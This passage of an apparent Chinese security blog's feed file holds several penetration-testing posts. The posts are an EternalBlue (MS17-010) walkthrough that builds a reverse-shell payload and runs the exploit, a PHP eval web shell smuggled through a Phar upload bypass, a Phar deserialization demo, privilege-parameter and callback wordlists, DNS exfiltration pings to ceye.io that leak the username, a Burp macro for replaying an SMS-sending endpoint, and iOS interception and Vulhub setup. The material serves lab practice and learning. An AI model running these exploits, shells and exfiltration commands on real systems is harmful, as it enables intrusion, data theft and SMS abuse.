class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Tue, 26 Feb 2019 07:56:53 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Cache-Control: private, must-revalidate</span><br><span class="line">pragma: no-cache</span><br><span class="line">expires: -1</span><br><span class="line">Set-Cookie: XSRF-TOKEN=nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9; expires=Wed, 13-Mar-2019 07:56:53 GMT; Max-Age=1296000; path=/</span><br><span class="line">Set-Cookie: dxy_session=WkmMYza7i0khDNJXIapui8nIA4VTZhcIAbFfQsvo; path=/</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 72</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;,&quot;data&quot;:&#123;&quot;message&quot;:&quot;\u53d1\u9001\u6210\u529f&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="这是一个短信发送的接口，第一个请求接受token然后第二个请求再调用。立马可以想到使用burpsuite中的Macros"><a href="#这是一个短信发送的接口，第一个请求接受token然后第二个请求再调用。立马可以想到使用burpsuite中的Macros" class="headerlink" title="这是一个短信发送的接口，第一个请求接受token然后第二个请求再调用。立马可以想到使用burpsuite中的Macros"></a>这是一个短信发送的接口，第一个请求接受token然后第二个请求再调用。立马可以想到使用burpsuite中的Macros</h4><p><img src="https://upload-images.jianshu.io/upload_images/14134003-c459019861eae8ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Macros"></p><h2 id="录制宏"><a href="#录制宏" class="headerlink" title="录制宏"></a>录制宏</h2><p><img src="https://upload-images.jianshu.io/upload_images/14134003-0edea79947e18df4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="录制宏"></p><h2 id="编辑宏"><a href="#编辑宏" class="headerlink" title="编辑宏"></a>编辑宏</h2><p><img src="https://upload-images.jianshu.io/upload_images/14134003-0026641755eb28a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="编辑宏"><br><img src="https://upload-images.jianshu.io/upload_images/14134003-456e7e18080809a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="添加新规则"><a href="#添加新规则" class="headerlink" title="添加新规则"></a>添加新规则</h2><p><a href="https://upload-images.jianshu.io/upload_images/14134003-dc4880295e5d7fc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="noopener"></a><br><img src="https://upload-images.jianshu.io/upload_images/14134003-0548eafa5c26588a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-c484cf10052daf74.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-5dacc2e30c064e27.gif?imageMogr2/auto-orient/strip" alt="效果图片"></p>]]></content>
      
      
      <categories>
          
          <category> 技术指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ms17-010(windows2012)</title>
      <link href="/2019/01/07/ms17-010/"/>
      <url>/2019/01/07/ms17-010/</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：192.168.2.110   &gt; kali<br>靶机：192.168.2.112    &gt; windows2012 R2 64(启用了Guest)</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>• NASM - <a href="http://www.nasm.us/" target="_blank" rel="noopener">http://www.nasm.us/</a><br>• Python v2.7 - <a href="https://www.python.org/download/releases/2.7/" target="_blank" rel="noopener">https://www.python.org/download/releases/2.7/</a><br>• Metasploit Framework - <a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1.从以下链接可以获得由Sleepya开发的内核shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/worawit/MS17-010/blob/master/shellcode/eternalblue_kshellcode_x64.asm</span><br></pre></td></tr></table></figure></p><p>2.我们使用以下命令来保存.asm文件，并使用NASM来编译，其命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm</span><br></pre></td></tr></table></figure></p><p>3.TCP生成反向shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell/reverse_tcp -f raw -o shell_msf.bin EXITFUNC=thread LHOST=192.168.2.110 lPORT=4444</span><br></pre></td></tr></table></figure></p><p>4.Shellcode前加上eternalblue内核，形成新的攻击载荷<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eternalblue_kshellcode_x64 shell_msf.bin &gt; reverse_shell.bin</span><br></pre></td></tr></table></figure></p><p>5.下载漏洞利用的python程序（windows server 2012）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/worawit/MS17-010/master/eternalblue_exploit8.py</span><br></pre></td></tr></table></figure></p><p>6.msf开启监听</p><blockquote><p>use exploit/multi/handler<br>set payload windows/x64/meterpreter/reverse_tcp<br>set LHOST 192.168.2.110<br>set LPORT 4444<br>exploit</p></blockquote><p>7.修改eternalblue_exploit8.py中的以下代码，设置登陆信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Windows 2012 does not allow anonymous to login if no share is accessible.</span><br><span class="line">USERNAME=&apos;Guest&apos;</span><br><span class="line">PASSWORD=&apos;&apos;</span><br></pre></td></tr></table></figure></p><p>8.运行eternalblue_exploit8.py，执行以下代码，启动攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python eternalblue_exploit8.py 192.168.2.112 reverse_shell.bin 500</span><br></pre></td></tr></table></figure></p><p>9.在metaspoilt上得到反弹结果，得到Windows的控制<br><img src="https://upload-images.jianshu.io/upload_images/14134003-95d70f80e41acf67.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码审计思路</title>
      <link href="/2019/01/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/"/>
      <url>/2019/01/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h2><h4 id="敏感函数回溯参数过程"><a href="#敏感函数回溯参数过程" class="headerlink" title="敏感函数回溯参数过程"></a>敏感函数回溯参数过程</h4><p>根据敏感函数来逆向追踪参数的传递过程，是目前使用的最多的一种方式。</p><h4 id="通读全文代码"><a href="#通读全文代码" class="headerlink" title="通读全文代码"></a>通读全文代码</h4><p>首先是看程序的大体代码结构，主目录有哪些文件，模块目录有哪些文件，插件目录有哪些文件。</p><h4 id="根据功能点定向审计"><a href="#根据功能点定向审计" class="headerlink" title="根据功能点定向审计"></a>根据功能点定向审计</h4><p>在熟悉了审计之后，就会知道哪些功能点通常会有漏洞，然后根据可能出现漏洞的地方开始审计，可以提高效率。</p><p><img src="https://images2017.cnblogs.com/blog/1062851/201710/1062851-20171031211339873-764826001.png" alt="思维导图"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phar利用姿势</title>
      <link href="/2018/12/25/phar/"/>
      <url>/2018/12/25/phar/</url>
      
        <content type="html"><![CDATA[<h2 id="Phar绕过上传"><a href="#Phar绕过上传" class="headerlink" title="Phar绕过上传"></a>Phar绕过上传</h2><blockquote><p>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure></p></blockquote><p>压缩后改后缀名为jpg</p><blockquote><p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&apos;phar://./test.jpg/test.php&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="Phar反序列化漏洞"><a href="#Phar反序列化漏洞" class="headerlink" title="Phar反序列化漏洞"></a>Phar反序列化漏洞</h2><blockquote><p>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Test&#123;</span><br><span class="line">        public $test=&quot;test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(&quot;test.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new Test();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    $phar-&gt;stopBuffering();    //签名自动计算</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="执行后生成test-phar"><a href="#执行后生成test-phar" class="headerlink" title="执行后生成test.phar"></a>执行后生成test.phar</h4><p><img src="https://upload-images.jianshu.io/upload_images/14134003-a852a42b11abe7d5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="test.phar"></p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><blockquote><p>eval.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo &quot;test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_get_contents(&quot;phar://./test.phar/test.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/14134003-f78014e27d966956.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="eval.php"></p>]]></content>
      
      
      <categories>
          
          <category> 技术指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逻辑权限字典</title>
      <link href="/2018/12/01/%E9%80%BB%E8%BE%91%E6%9D%83%E9%99%90%E5%AD%97%E5%85%B8/"/>
      <url>/2018/12/01/%E9%80%BB%E8%BE%91%E6%9D%83%E9%99%90%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">callback=txf</span><br><span class="line">cb=txf</span><br><span class="line">jsonp=txf</span><br><span class="line">jsonpcallback=txf</span><br><span class="line">jsonpcb=txf</span><br><span class="line">jsconpcb=txf</span><br><span class="line">json=txf</span><br><span class="line">jsonp=txf</span><br><span class="line">jsoncallback=txf</span><br><span class="line">jcb=txf</span><br><span class="line">call=txf</span><br><span class="line">jsoncallb=txf</span><br><span class="line">json_callb=txf</span><br><span class="line">jsonp_callback=txf</span><br><span class="line">json_callback=txf</span><br><span class="line">jsonp_cb=txf</span><br><span class="line">callbackparam=txf</span><br><span class="line">jsconpcb=txf</span><br><span class="line">jscon=txf</span><br><span class="line">jsconcallback=txf</span><br></pre></td></tr></table></figure><h2 id="管理员"><a href="#管理员" class="headerlink" title="管理员"></a>管理员</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">access=1</span><br><span class="line">access=true</span><br><span class="line">access=y</span><br><span class="line">adm=1</span><br><span class="line">adm1n=1</span><br><span class="line">adm1n=true</span><br><span class="line">adm1n=y</span><br><span class="line">adm1n=yes</span><br><span class="line">admin=1</span><br><span class="line">admin=true</span><br><span class="line">admin=y</span><br><span class="line">admin=yes</span><br><span class="line">adm=true</span><br><span class="line">adm=y</span><br><span class="line">admin=yes</span><br><span class="line">adm=yes</span><br><span class="line">dbg=1</span><br><span class="line">dbg=true</span><br><span class="line">dbg=y</span><br><span class="line">dbg=yes</span><br><span class="line">debug=1</span><br><span class="line">debug=true</span><br><span class="line">debug=y</span><br><span class="line">debug=yes</span><br><span class="line">edit=1</span><br><span class="line">edit=true</span><br><span class="line">edit=y</span><br><span class="line">edit=yes</span><br><span class="line">grant=1</span><br><span class="line">grant=true</span><br><span class="line">grant=y</span><br><span class="line">grant=yes</span><br><span class="line">test=1</span><br><span class="line">test=true</span><br><span class="line">test=y</span><br><span class="line">test=yes</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 资源分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>subDomainsBrute安装说明</title>
      <link href="/2018/11/21/subdomain/"/>
      <url>/2018/11/21/subdomain/</url>
      
        <content type="html"><![CDATA[<h2 id="python环境"><a href="#python环境" class="headerlink" title="python环境"></a>python环境</h2><p>我用的2.7.10</p><h2 id="子域名爆破（subDomainsBrute）"><a href="#子域名爆破（subDomainsBrute）" class="headerlink" title="子域名爆破（subDomainsBrute）"></a>子域名爆破（subDomainsBrute）</h2><p><a href="https://codeload.github.com/lijiejie/subDomainsBrute/zip/master" target="_blank" rel="noopener">github下载</a></p><h2 id="更新pip"><a href="#更新pip" class="headerlink" title="更新pip"></a>更新pip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><h2 id="安装依赖环境"><a href="#安装依赖环境" class="headerlink" title="安装依赖环境"></a>安装依赖环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install dnspython gevent</span><br></pre></td></tr></table></figure><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Usage: subDomainsBrute.py [options] target.com</span><br><span class="line">Options:</span><br><span class="line">  --version             show program&apos;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -f FILE               File contains new line delimited subs, default is</span><br><span class="line">                        subnames.txt.</span><br><span class="line">  --full                Full scan, NAMES FILE subnames_full.txt will be used</span><br><span class="line">                        to brute</span><br><span class="line">  -i, --ignore-intranet</span><br><span class="line">                        Ignore domains pointed to private IPs</span><br><span class="line">  -t THREADS, --threads=THREADS</span><br><span class="line">                        Num of scan threads, 200 by default</span><br><span class="line">  -p PROCESS, --process=PROCESS</span><br><span class="line">                        Num of scan Process, 6 by default</span><br><span class="line">  -o OUTPUT, --output=OUTPUT</span><br><span class="line">                        Output file name. default is &#123;target&#125;.txt</span><br></pre></td></tr></table></figure><h2 id="kali下载直接用"><a href="#kali下载直接用" class="headerlink" title="kali下载直接用"></a>kali下载直接用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python subDomainsBrute.py xxx.com</span><br></pre></td></tr></table></figure><p><strong>不要加www</strong></p>]]></content>
      
      
      <categories>
          
          <category> 技术指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ceye的基础应用</title>
      <link href="/2018/11/11/ceye/"/>
      <url>/2018/11/11/ceye/</url>
      
        <content type="html"><![CDATA[<h1 id="ceyo网站"><a href="#ceyo网站" class="headerlink" title="ceyo网站"></a>ceyo网站</h1><h3>注册</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ceye.io/</span><br></pre></td></tr></table></figure><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.1odz7u.ceye.io</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-836ea45fb6d94760.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ping"><br><img src="https://upload-images.jianshu.io/upload_images/14134003-e9fe9b53317057ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ceye"></p><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.1odz7u.ceye.io</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-705e2b3816eceb7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ping"><br><img src="https://upload-images.jianshu.io/upload_images/14134003-30614d9dd0f60d50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ceye"></p><h3 id="win的常用变量"><a href="#win的常用变量" class="headerlink" title="win的常用变量"></a>win的常用变量</h3><hr><table><thead><tr><th>//变量</th><th style="text-align:center">类型</th><th style="text-align:right">描述</th></tr></thead><tbody><tr><td>//%ALLUSERSPROFILE%</td><td style="text-align:center">本地</td><td style="text-align:right">返回“所有用户”配置文件的位置。</td></tr><tr><td>//%APPDATA%</td><td style="text-align:center">本地</td><td style="text-align:right">返回默认情况下应用程序存储数据的位置。</td></tr><tr><td>//%CD%</td><td style="text-align:center">本地</td><td style="text-align:right">返回当前目录字符串。</td></tr><tr><td>//%CMDCMDLINE%</td><td style="text-align:center">本地</td><td style="text-align:right">返回用来启动当前的 Cmd.exe 的准确命令行。</td></tr><tr><td>//%CMDEXTVERSION%</td><td style="text-align:center">系统</td><td style="text-align:right">返回当前的“命令处理程序扩展”的版本号。</td></tr><tr><td>//%COMPUTERNAME%</td><td style="text-align:center">系统</td><td style="text-align:right">返回计算机的名称。</td></tr><tr><td>//%COMSPEC%</td><td style="text-align:center">系统</td><td style="text-align:right">返回命令行解释器可执行程序的准确路径。</td></tr><tr><td>//%DATE%</td><td style="text-align:center">系统</td><td style="text-align:right">返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</td></tr><tr><td>//%ERRORLEVEL%</td><td style="text-align:center">系统</td><td style="text-align:right">返回上一条命令的错误代码。通常用非零值表示错误。</td></tr><tr><td>//%HOMEDRIVE%</td><td style="text-align:center">系统</td><td style="text-align:right">返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>//%HOMEPATH%</td><td style="text-align:center">系统</td><td style="text-align:right">返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>//%HOMESHARE%</td><td style="text-align:center">系统</td><td style="text-align:right">返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>//%LOGONSERVER%</td><td style="text-align:center">本地</td><td style="text-align:right">返回验证当前登录会话的域控制器的名称。</td></tr><tr><td>//%NUMBER_OF_PROCESSORS%</td><td style="text-align:center">系统</td><td style="text-align:right">指定安装在计算机上的处理器的数目。</td></tr><tr><td>//%OS%</td><td style="text-align:center">系统</td><td style="text-align:right">返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</td></tr><tr><td>//%PATH%</td><td style="text-align:center">系统</td><td style="text-align:right">指定可执行文件的搜索路径。</td></tr><tr><td>//%PATHEXT%</td><td style="text-align:center">系统</td><td style="text-align:right">返回操作系统认为可执行的文件扩展名的列表。</td></tr><tr><td>//%PROCESSOR_ARCHITECTURE%</td><td style="text-align:center">系统</td><td style="text-align:right">返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</td></tr><tr><td>//%PROCESSOR_IDENTFIER%</td><td style="text-align:center">系统</td><td style="text-align:right">返回处理器说明。</td></tr><tr><td>//%PROCESSOR_LEVEL%</td><td style="text-align:center">系统</td><td style="text-align:right">返回计算机上安装的处理器的型号。</td></tr><tr><td>//%PROCESSOR_REVISION%</td><td style="text-align:center">系统</td><td style="text-align:right">返回处理器的版本号。</td></tr><tr><td>//%PROMPT%</td><td style="text-align:center">本地</td><td style="text-align:right">返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</td></tr><tr><td>//%RANDOM%</td><td style="text-align:center">系统</td><td style="text-align:right">返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</td></tr><tr><td>//%SYSTEMDRIVE%</td><td style="text-align:center">系统</td><td style="text-align:right">返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</td></tr><tr><td>//%SYSTEMROOT%</td><td style="text-align:center">系统</td><td style="text-align:right">返回 Windows server operating system 根目录的位置。</td></tr><tr><td>//%TEMP%和%TMP%</td><td style="text-align:center">系统和用户</td><td style="text-align:right">返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</td></tr><tr><td>//%TIME%</td><td style="text-align:center">系统</td><td style="text-align:right">返回当前时间。使用与                                                                                   time       /t                                                                     命令相同的格式。由         Cmd.exe                  生成。有关                       time   命令的详细信息，请参阅 Time。</td></tr><tr><td>//%USERDOMAIN%</td><td style="text-align:center">本地</td><td style="text-align:right">返回包含用户帐户的域的名称。</td></tr><tr><td>//%USERNAME%</td><td style="text-align:center">本地</td><td style="text-align:right">返回当前登录的用户的名称。</td></tr><tr><td>//%USERPROFILE%</td><td style="text-align:center">本地</td><td style="text-align:right">返回当前用户的配置文件的位置。</td></tr><tr><td>//%WINDIR%</td><td style="text-align:center">系统</td><td style="text-align:right">返回操作系统目录的位置。</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> 技术指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IOS-APP抓包设置</title>
      <link href="/2018/10/02/appios/"/>
      <url>/2018/10/02/appios/</url>
      
        <content type="html"><![CDATA[<h2 id="ios-手机设置"><a href="#ios-手机设置" class="headerlink" title="ios 手机设置"></a>ios 手机设置</h2><p>1.电脑与手机处于同一局域网，在ios无线网络设置手动代理<br><img src="https://upload-images.jianshu.io/upload_images/14134003-c0b8ca5ddb8c7e7c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="app"><br>2.在burpsuite设置代理<br><img src="https://upload-images.jianshu.io/upload_images/14134003-1a4750d077bf73be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="burp"><br>3.用手机访问设置的代理ip下载CA证书<br><img src="https://upload-images.jianshu.io/upload_images/14134003-c270d220159de209.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="CA"><br>4.安装CA证书<br><img src="https://upload-images.jianshu.io/upload_images/14134003-f3df993c8a6648c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="安装CA"></p><h2 id="发现有些APP无法抓到数据包"><a href="#发现有些APP无法抓到数据包" class="headerlink" title="发现有些APP无法抓到数据包"></a>发现有些APP无法抓到数据包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOS手机设置--通用--关于本机--证书信任设置开启状态</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-676652cab947d881.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="开启信任证书设置"></p>]]></content>
      
      
      <categories>
          
          <category> app渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulhub的安装调试</title>
      <link href="/2018/08/24/vulhub/"/>
      <url>/2018/08/24/vulhub/</url>
      
        <content type="html"><![CDATA[<h2 id="Vulhub"><a href="#Vulhub" class="headerlink" title="Vulhub"></a>Vulhub</h2><blockquote><p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。</p></blockquote><h2 id="在ubuntu16-04下安装-官网介绍"><a href="#在ubuntu16-04下安装-官网介绍" class="headerlink" title="在ubuntu16.04下安装(官网介绍)"></a>在ubuntu16.04下安装(官网介绍)</h2><h4 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python3</span><br></pre></td></tr></table></figure><h4 id="安装最新版docker"><a href="#安装最新版docker" class="headerlink" title="安装最新版docker"></a>安装最新版docker</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><h4 id="启动docker服务"><a href="#启动docker服务" class="headerlink" title="启动docker服务"></a>启动docker服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><h4 id="安装compose"><a href="#安装compose" class="headerlink" title="安装compose"></a>安装compose</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install docker-compose</span><br></pre></td></tr></table></figure><p><em>我安装的时候发现需要：</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt  install docker-compose</span><br></pre></td></tr></table></figure></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h4 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line">cd vulhub-master</span><br></pre></td></tr></table></figure><h4 id="进入某一个漏洞-环境的目录"><a href="#进入某一个漏洞-环境的目录" class="headerlink" title="进入某一个漏洞/环境的目录"></a>进入某一个漏洞/环境的目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd flask/ssti</span><br></pre></td></tr></table></figure><h4 id="自动化编译环境"><a href="#自动化编译环境" class="headerlink" title="自动化编译环境"></a>自动化编译环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose 